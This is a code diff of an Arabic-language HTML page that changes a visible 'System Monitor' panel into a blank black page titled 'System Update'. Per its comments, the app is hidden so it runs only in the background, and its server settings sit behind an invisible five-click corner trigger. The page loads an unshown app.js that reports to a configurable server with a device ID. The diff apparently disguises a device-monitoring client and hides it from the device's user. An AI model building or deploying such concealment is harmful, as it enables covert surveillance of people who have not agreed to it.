@@ -1,283 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Monitor</title>
+    <title>System Update</title>
+    <meta name="theme-color" content="#000000">
     <style>
-        :root {
-            --primary-color: #00ff41;
-            --bg-color: #0a0a0a;
-            --panel-bg: #141414;
-            --text-color: #e0e0e0;
-            --border-color: #333;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+        /* إخفاء كامل للتطبيق ليعمل في الخلفية فقط */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { 
+            width: 100%; 
+            height: 100%; 
+            background: #000; 
             overflow: hidden;
+            display: block !important;
+            visibility: visible !important;
+            opacity: 1 !important;
         }
-
-        .main-container {
-            width: 90%;
-            max-width: 500px;
-            background: var(--panel-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 2rem;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            text-align: center;
-            position: relative;
+        #app { 
+            display: none; 
+            visibility: hidden;
+            opacity: 0;
         }
-
-        .header {
-            margin-bottom: 2rem;
-        }
-
-        .logo {
-            font-size: 3rem;
-            color: var(--primary-color);
-            margin-bottom: 1rem;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.05); opacity: 0.7; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .status-badge {
-            display: inline-block;
-            padding: 0.5rem 1rem;
-            background: rgba(0, 255, 65, 0.1);
-            border: 1px solid var(--primary-color);
-            border-radius: 20px;
-            color: var(--primary-color);
-            font-size: 0.8rem;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 1rem;
-            text-align: right;
-            margin-bottom: 2rem;
-        }
-
-        .info-item {
-            padding: 1rem;
-            background: rgba(255,255,255,0.03);
-            border-radius: 8px;
-            border-right: 3px solid var(--primary-color);
-        }
-
-        .info-label {
-            font-size: 0.7rem;
-            color: #888;
-            margin-bottom: 0.3rem;
-        }
-
-        .info-value {
-            font-size: 0.9rem;
-            font-family: 'Courier New', Courier, monospace;
-            word-break: break-all;
-        }
-
-        .setup-btn {
-            background: transparent;
-            border: 1px solid var(--primary-color);
-            color: var(--primary-color);
-            padding: 0.8rem 1.5rem;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-weight: bold;
-        }
-
-        .setup-btn:hover {
-            background: var(--primary-color);
-            color: #000;
-        }
-
-        /* Modal Styles */
-        .modal {
-            display: none;
+        /* نقطة سرية جداً للدخول للإعدادات في حال الحاجة */
+        .secret-trigger {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85);
-            z-index: 100;
-            backdrop-filter: blur(5px);
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal.active { display: flex; }
-
-        .modal-content {
-            background: var(--panel-bg);
-            width: 90%;
-            max-width: 400px;
-            padding: 2rem;
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-            text-align: right;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 0.8rem;
-            color: #888;
-            margin-bottom: 0.5rem;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 0.8rem;
-            background: #000;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            color: #fff;
-            font-family: monospace;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-        }
-
-        .actions {
-            display: flex;
-            gap: 1rem;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 0.8rem;
-            border-radius: 6px;
-            border: none;
+            bottom: 0;
+            right: 0;
+            width: 5px;
+            height: 5px;
+            background: transparent;
+            z-index: 9999;
             cursor: pointer;
-            font-weight: bold;
         }
-
-        .btn-primary { background: var(--primary-color); color: #000; }
-        .btn-secondary { background: #333; color: #fff; }
-
-        .msg {
-            margin-top: 1rem;
-            font-size: 0.8rem;
-            min-height: 1.2rem;
-        }
-        .msg.error { color: #ff4444; }
-        .msg.success { color: var(--primary-color); }
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <div class="header">
-            <div class="logo">📡</div>
-            <div class="status-badge" id="statusBadge">جاري التشغيل</div>
+    <div id="app"></div>
+    <div class="secret-trigger" onclick="openSecretSettings()"></div>
+
+    <!-- شاشة الإعدادات السرية -->
+    <div id="secretSettings" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; color:#0f0; padding:20px; font-family:monospace; direction:ltr; text-align:left;">
+        <h2 style="color:#0f0; border-bottom:1px solid #0f0; padding-bottom:10px;">🛠️ SYSTEM CONFIG</h2>
+        <div style="margin:20px 0;">
+            <label>SERVER_URL:</label><br>
+            <input type="text" id="secretServerUrl" style="width:100%; background:#111; border:1px solid #0f0; color:#0f0; padding:10px; margin-top:5px;">
         </div>
-
-        <div class="info-grid">
-            <div class="info-item">
-                <div class="info-label">معرف الجهاز (Device ID)</div>
-                <div class="info-value" id="displayDeviceId">تحميل...</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">رابط الخادم (Server URL)</div>
-                <div class="info-value" id="displayServerUrl">تحميل...</div>
-            </div>
-            <div class="info-item">
-                <div class="info-label">آخر تحديث</div>
-                <div class="info-value" id="displayLastUpdate">-</div>
-            </div>
+        <div style="display:flex; gap:10px;">
+            <button onclick="saveSecretSettings()" style="background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold;">SAVE & RESTART</button>
+            <button onclick="closeSecretSettings()" style="background:#333; color:#fff; border:none; padding:10px 20px; cursor:pointer;">CLOSE</button>
         </div>
-
-        <button class="setup-btn" onclick="toggleModal(true)">⚙️ إعدادات الخادم</button>
-        <div class="msg" id="mainMsg"></div>
-    </div>
-
-    <!-- Settings Modal -->
-    <div class="modal" id="settingsModal">
-        <div class="modal-content">
-            <h3 style="margin-bottom: 1.5rem; text-align: center;">إعدادات النظام</h3>
-            
-            <div class="form-group">
-                <label>رابط الخادم (Server URL)</label>
-                <input type="text" id="inputServerUrl" placeholder="https://your-server.com">
-            </div>
-
-            <div class="actions">
-                <button class="btn btn-primary" onclick="saveSettings()">حفظ وإعادة تشغيل</button>
-                <button class="btn btn-secondary" onclick="toggleModal(false)">إلغاء</button>
-            </div>
-            <div class="msg" id="modalMsg"></div>
+        <div style="margin-top:20px; font-size:12px; color:#666;">
+            DEVICE_ID: <span id="secretDeviceId">-</span><br>
+            STATUS: <span id="secretStatus">RUNNING</span>
         </div>
     </div>
 
     <script src="app.js"></script>
     <script>
-        function toggleModal(show) {
-            const modal = document.getElementById('settingsModal');
-            if (show) {
-                document.getElementById('inputServerUrl').value = localStorage.getItem('SERVER_URL') || '';
-                modal.classList.add('active');
-            } else {
-                modal.classList.remove('active');
-            }
+        function openSecretSettings() {
+            document.getElementById('secretServerUrl').value = localStorage.getItem('SERVER_URL') || 'http://localhost:3000';
+            document.getElementById('secretDeviceId').textContent = localStorage.getItem('deviceId') || 'NOT_REGISTERED';
+            document.getElementById('secretSettings').style.display = 'block';
         }
-
-        function saveSettings() {
-            const url = document.getElementById('inputServerUrl').value.trim();
-            if (!url) {
-                showMsg('modalMsg', 'يرجى إدخال رابط صحيح', true);
-                return;
-            }
-            
-            try {
-                new URL(url); // Validate URL format
+        function closeSecretSettings() {
+            document.getElementById('secretSettings').style.display = 'none';
+        }
+        function saveSecretSettings() {
+            const url = document.getElementById('secretServerUrl').value.trim();
+            if (url) {
                 localStorage.setItem('SERVER_URL', url);
-                showMsg('modalMsg', 'تم الحفظ بنجاح! جاري إعادة التشغيل...', false);
-                setTimeout(() => location.reload(), 1500);
-            } catch (e) {
-                showMsg('modalMsg', 'رابط غير صالح (يجب أن يبدأ بـ http أو https)', true);
+                alert('Saved! Restarting...');
+                location.reload();
             }
         }
-
-        function showMsg(id, text, isError) {
-            const el = document.getElementById(id);
-            el.textContent = text;
-            el.className = 'msg ' + (isError ? 'error' : 'success');
-        }
-
-        function updateUI() {
-            document.getElementById('displayDeviceId').textContent = localStorage.getItem('deviceId') || 'غير مسجل';
-            document.getElementById('displayServerUrl').textContent = localStorage.getItem('SERVER_URL') || 'غير محدد';
-            document.getElementById('displayLastUpdate').textContent = new Date().toLocaleTimeString();
-        }
-
-        setInterval(updateUI, 5000);
-        updateUI();
+        // النقر 5 مرات متتالية في الركن السفلي الأيمن يفتح الإعدادات
+        let clickCount = 0;
+        document.querySelector('.secret-trigger').addEventListener('click', () => {
+            clickCount++;
+            if (clickCount >= 5) {
+                openSecretSettings();
+                clickCount = 0;
+            }
+            setTimeout(() => { clickCount = 0; }, 2000);
+        });
     </script>
 </body>
 </html>
